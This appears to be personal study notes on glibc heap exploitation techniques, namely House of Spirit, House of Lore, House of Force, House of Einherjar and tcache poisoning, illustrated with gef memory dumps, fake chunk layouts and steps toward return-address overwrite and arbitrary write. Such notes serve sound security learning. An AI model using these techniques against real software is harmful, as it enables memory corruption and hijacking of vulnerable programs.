# House of Spirit

This type of exploit revolves around being able to create a fake chunk with "valid" looking size information, so that upon freeing said chunk it will insert that memory region into the corresponding bin.

We practically rely on how lazily libc checks the sanity of fake chunks.

In ubuntu 16.04, fastbin is used for house of spirit (so the sizes need to correspond to what fastbin accepts, i.e. less than 128 (0x80) bytes). We need 2 chunks, one that we will free then a following one with a sane looking size header.

In ubuntu 20.04 we use tcache, and it seems libc is even more lax. We only need a fake chunk with a correct looking size and free it.

# House of Lore

We try to use small bin in order to spawn a fake chunk at the place of our liking.

This one seems to be aimed at creating a fake chunk anywhere, as long as we are able to create a fake freelist and overwrite a bk ptr of a victim chunk. Allocating back the victim chunk with bk ptr overwritten will allow us to spawn a fake chunk.

In the example, we can then write anywhere in the fake chunk to overwrite the return pointer while avoiding to overwrite the canary.

The "fake a freelist" seems to come from libc2.31, which have strictier checks compared to previous versions.

## Preparation of metadata for free

For this part we suppose we can write whatever we want somewhere, and we know the address of the victim malloced chunk.

`fake_freelist` (it contained uninitialized junk):
```
0x7fffffffdb10:	0x0000034000000340	0x0000034000000340  <unused part * 2>
0x7fffffffdb20:	0x0000034000000340	0x00007fffffffdb30  <unused part + link to next freelist item>
0x7fffffffdb30:	0x0000034000000340	0x0000034000000340
0x7fffffffdb40:	0x0000000000000000	0x00007fffffffdb50  <same as above, but with another link>
0x7fffffffdb50:	0x0000000000000000	0x0000000000000000
0x7fffffffdb60:	0x0000000000000000	0x00007fffffffdb70
0x7fffffffdb70:	0x0000000000000000	0x0000000000000000
0x7fffffffdb80:	0x0000000000000000	0x00007fffffffdb90
0x7fffffffdb90:	0x0000000000000000	0x0000000000001007
0x7fffffffdba0:	0x0000555555554040	0x00007fffffffdbb0
0x7fffffffdbb0:	0x00007fffffffdc20	0x00007fffffffe059
0x7fffffffdbc0:	0x00007ffff7fd1700	0x00007fffffffdbd0
0x7fffffffdbd0:	0x00007ffff7fadfc8	0x00005555555559b0
0x7fffffffdbe0:	0x0000000000000000	0x0000000000000000  <the freelist ends with a null pointer>
```
Each item in the freelist is 4 words long.

Crafted chunks in the stack:
```
0x7fffffffda90:	0x0000000000000000	0x0000000000000000
0x7fffffffdaa0:	0x00007fffffffdab0	0x00007fffffffdb10  <ptr to chunk bellow, ptr to freelist>
0x7fffffffdab0:	0x0000000000000000	0x0000000000000000
0x7fffffffdac0:	0x0000555555559290	0x00007fffffffda90  <ptr to victim malloced chunk, ptr to chunk above>
```

## Freeing victim chunk

We then need to free the victim chunk and put it to small bin. In order to do so, we need to make sure tcache is filled and there is no consolidation.

## Overwrite victim chunk

Once the victim chunk is in small bin, we overwrite its bk pointer so it points to our crafted chunk in the stack.
```
gef➤  x/4gx 0x555555559290
0x555555559290:	0x0000000000000000	0x0000000000000111  <headers of victim pointer>
0x5555555592a0:	0x00007ffff7fa8ce0	0x00007fffffffdab0  <valid fd ptr, bk ptr to our crafted entry>
```

The crafted entry bk ptr points to have the address of the victim chunk as its fd ptr, so the double link is here.

## Allocate victime chunk

First use all chunks from tcache, then allocate victim chunk.

Before:
```
─────────────────────────────────────────────────────────────────────────────────── Tcachebins for arena 0x7ffff7fa8b80 ───────────────────────────────────────────────────────────────────────────────────
──────────────────────────────────────────────────────────────────────────────────── Fastbins for arena 0x7ffff7fa8b80 ────────────────────────────────────────────────────────────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
─────────────────────────────────────────────────────────────────────────────────── Unsorted Bin for arena 'main_arena' ───────────────────────────────────────────────────────────────────────────────────
[+] Found 0 chunks in unsorted bin.
──────────────────────────────────────────────────────────────────────────────────── Small Bins for arena 'main_arena' ────────────────────────────────────────────────────────────────────────────────────
[+] small_bins[16]: fw=0x555555559290, bk=0x555555559290
 →   Chunk(addr=0x5555555592a0, size=0x110, flags=PREV_INUSE)
[+] Found 1 chunks in 1 small non-empty bins.
```

After:
```
─────────────────────────────────────────────────────────────────────────────────── Tcachebins for arena 0x7ffff7fa8b80 ───────────────────────────────────────────────────────────────────────────────────
Tcachebins[idx=15, size=0x110] count=7  ←  Chunk(addr=0x7fffffffdba0, size=0x1000, flags=PREV_INUSE|IS_MMAPPED|NON_MAIN_ARENA)  ←  Chunk(addr=0x7fffffffdb80, size=0x0, flags=)  ←  Chunk(addr=0x7fffffffdb60, size=0x0, flags=)  ←  Chunk(addr=0x7fffffffdb40, size=0x34000000340, flags=)  ←  Chunk(addr=0x7fffffffdb20, size=0x34000000340, flags=)  ←  Chunk(addr=0x7fffffffdaa0, size=0x0, flags=)  ←  Chunk(addr=0x7fffffffdac0, size=0x0, flags=) 
──────────────────────────────────────────────────────────────────────────────────── Fastbins for arena 0x7ffff7fa8b80 ────────────────────────────────────────────────────────────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
─────────────────────────────────────────────────────────────────────────────────── Unsorted Bin for arena 'main_arena' ───────────────────────────────────────────────────────────────────────────────────
[+] Found 0 chunks in unsorted bin.
──────────────────────────────────────────────────────────────────────────────────── Small Bins for arena 'main_arena' ────────────────────────────────────────────────────────────────────────────────────
[+] small_bins[16]: fw=0x555555559290, bk=0x7fffffffdbb1
 →   Chunk(addr=0x5555555592a0, size=0x110, flags=PREV_INUSE)
[+] Found 1 chunks in 1 small non-empty bins.
```

We can see lots of chunk appear in the tcache bins !

Allocating a chunk again will give us the chunk we crafted in the stack.

## Overwriting return address

The freshly crafted chunk is supposed to be of length 0x100, which should be enough to include the return address (and also the canary). In the example, we overwrite specifically the return address, in a way where we can circumvent the canary.

# House of Force

This one is about overwriting the top chunk, which represents the heap region that has not been allocated yet.

## Overwrite top chunk

For this exploit, we first overwrite the top chunk.
```
0x555555757250:	0x0000000000000000	0x0000000000000111  <overflowing chunk>
0x555555757260:	0x0000000000000000	0x0000000000000000
0x555555757270:	0x0000000000000000	0x0000000000000000
0x555555757280:	0x0000000000000000	0x0000000000000000
0x555555757290:	0x0000000000000000	0x0000000000000000
0x5555557572a0:	0x0000000000000000	0x0000000000000000
0x5555557572b0:	0x0000000000000000	0x0000000000000000
0x5555557572c0:	0x0000000000000000	0x0000000000000000
0x5555557572d0:	0x0000000000000000	0x0000000000000000
0x5555557572e0:	0x0000000000000000	0x0000000000000000
0x5555557572f0:	0x0000000000000000	0x0000000000000000
0x555555757300:	0x0000000000000000	0x0000000000000000
0x555555757310:	0x0000000000000000	0x0000000000000000
0x555555757320:	0x0000000000000000	0x0000000000000000
0x555555757330:	0x0000000000000000	0x0000000000000000
0x555555757340:	0x0000000000000000	0x0000000000000000
0x555555757350:	0x0000000000000000	0x0000000000000000
0x555555757360:	0x0000000000000000	0x0000000000020ca1  <top chunk to overwrite>
0x555555757370:	0x0000000000000000	0x0000000000000000
```

After the overwrite:
```
0x555555757350:	0x0000000000000000	0x0000000000000000
0x555555757360:	0x0000000000000000	0xffffffffffffffff
0x555555757370:	0x0000000000000000	0x0000000000000000
```
The size is overwritten so that whatever we request for allocation, it will be done without the necessity to call `mmap`.

## Allocate a big big chunk

Now in order to allocate a chunk that will contain memory region outside of the heap, we need to allocate a big chunk of memory.

To do so, we can compute the size such as:
```
big_size = target_addr - top_chunk_addr - 2 * header_size
```

In my case a header is `2 * long`.

Once allocated we got:
```
gef➤  heap chunks
Chunk(addr=0x555555757010, size=0x250, flags=PREV_INUSE)
    [0x0000555555757010     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x555555757260, size=0x110, flags=PREV_INUSE)
    [0x0000555555757260     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
Chunk(addr=0x555555757370, size=0xffffffffffffecb0, flags=PREV_INUSE)   <big big chunk !>
    [0x0000555555757370     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
```
(At this point, `heap chunks` fails to display any following chunks, since the addresses are too big)

Now we filled the gap between our chunk and the target addr !

## Allocate on our target

All that's left is to allocate a chunk that will contain the target addr. And then we can do whatever we are allowed to do with a memory chunk.

## Compatibility

This exploit seems to be feasible up to 2.27. Unfortunate ! Since I quite liked the simplicity of it.


# House of Einherjar

This attack is named after Old North warrior that takes battle on one on one. I think it is because the crux of the attack is overwriting the heap metadata of an adjacent chunk with a single byte overflow.

## Prepare a fake chunk

First prepare a fake chunk. In the example from shellphish (for libc2.31), it will look like:
```
0x555555559290:	0x0000000000000000	0x0000000000000041  <actual chunk header>
0x5555555592a0:	0x0000000000000000	0x0000000000000060  <fake chunk header>
0x5555555592b0:	0x00005555555592a0	0x00005555555592a0  <fake fd and bk pointers>
0x5555555592c0:	0x0000000000000000	0x0000000000000000
0x5555555592d0:	0x0000000000000000	0x0000000000020d31  <another chunk, here it's the top chunk>
```

## Prepare fake chunk consolidation

We then allocate a chunk that will be overflowed to write over the next chunk. Its size is chosen accordingly with the fake chunk header:
```
0x555555559290:	0x0000000000000000	0x0000000000000041
0x5555555592a0:	0x0000000000000000	0x0000000000000060  <fake chunk>
0x5555555592b0:	0x00005555555592a0	0x00005555555592a0
0x5555555592c0:	0x0000000000000000	0x0000000000000000
0x5555555592d0:	0x0000000000000000	0x0000000000000031  <chunk that will overflow>
0x5555555592e0:	0x0000000000000000	0x0000000000000000
0x5555555592f0:	0x0000000000000000	0x0000000000000000
0x555555559300:	0x0000000000000000	0x0000000000000101  <chunk that is going to be overflowed>
0x555555559310:	0x0000000000000000	0x0000000000000000
0x555555559320:	0x0000000000000000	0x0000000000000000
```

It is advised to have a chunk that size ends with `0x00`, since we will then be able to overwrite just the `PREV_INUSE` flag. So after the overflow it will look like:
```
0x5555555592d0:	0x0000000000000000	0x0000000000000031
0x5555555592e0:	0x0000000000000000	0x0000000000000000
0x5555555592f0:	0x0000000000000000	0x0000000000000000
0x555555559300:	0x0000000000000000	0x0000000000000100  <prev_inuse overwritten !>
```

We also need to make sure that previous size corresponds to the fake chunk's size:
```
0x5555555592a0:	0x0000000000000000	0x0000000000000060
0x5555555592b0:	0x00005555555592a0	0x00005555555592a0
0x5555555592c0:	0x0000000000000000	0x0000000000000000
0x5555555592d0:	0x0000000000000000	0x0000000000000031
0x5555555592e0:	0x0000000000000000	0x0000000000000000
0x5555555592f0:	0x0000000000000000	0x0000000000000000
0x555555559300:	0x0000000000000060	0x0000000000000100  <prev size also put here>
```

Finally, we'll have to fill up tcache before doing the actual consolidation work.

## Actual consolidation

Now when we free the overwritten chunk, we'll have a `0x160` chunk in the unsorted bin, and the some fd/bk pointers updated:
```
0x555555559290:	0x0000000000000000	0x0000000000000041
0x5555555592a0:	0x0000000000000000	0x0000000000000161  <fake consolidated chunk in unsorted bin>
0x5555555592b0:	0x00007ffff7fa8be0	0x00007ffff7fa8be0
0x5555555592c0:	0x0000000000000000	0x0000000000000000
0x5555555592d0:	0x0000000000000000	0x0000000000000031
0x5555555592e0:	0x0000000000000000	0x0000000000000000
0x5555555592f0:	0x0000000000000000	0x0000000000000000
0x555555559300:	0x0000000000000060	0x0000000000000100  <freed and consolidated with fake chunk>
0x555555559310:	0x0000000000000000	0x0000000000000000
```

If we allocate a chunk of size 0x160 (e.g. by asking for 0x158), we will get this fake one.

By the way it will not appear with `heap chunks` since I guess it is using the size in order to deduce which chunk to print. And the fake chunks are not aligned with all the initial size so they don't appear.

## tcache poisoning

Because of a sanity check, we need to allocate a chunk as padding.

If we now free the overflowing chunk (the one which size is 0x30), we will be able to overwrite its fd/bk pointer thanks to the fake consolidated chunk we just allocated before.

```
0x555555559290:	0x0000000000000000	0x0000000000000041
0x5555555592a0:	0x0000000000000000	0x0000000000000161  <fake consolidated chunk>
0x5555555592b0:	0x0000000000000000	0x0000000000000000
0x5555555592c0:	0x0000000000000000	0x0000000000000000
0x5555555592d0:	0x0000000000000000	0x0000000000000031  <freshly freed chunk>
0x5555555592e0:	0x0000555555559b10	0x0000555555559010  <pointers to overwrite>
0x5555555592f0:	0x0000000000000000	0x0000000000000000
0x555555559300:	0x0000000000000060	0x0000000000000100
0x555555559310:	0x0000000000000000	0x0000000000000000
```

For instance we can overwrite it's fd pointer with a target address, e.g.
```
0x5555555592d0:	0x0000000000000000	0x0000000000000031
0x5555555592e0:	0x00007fffffffdb80	0x0000555555559010  <somewhere interesting ;)>
0x5555555592f0:	0x0000000000000000	0x0000000000000000
```

Allocating this corrupted/poisoned chunk will give us write access !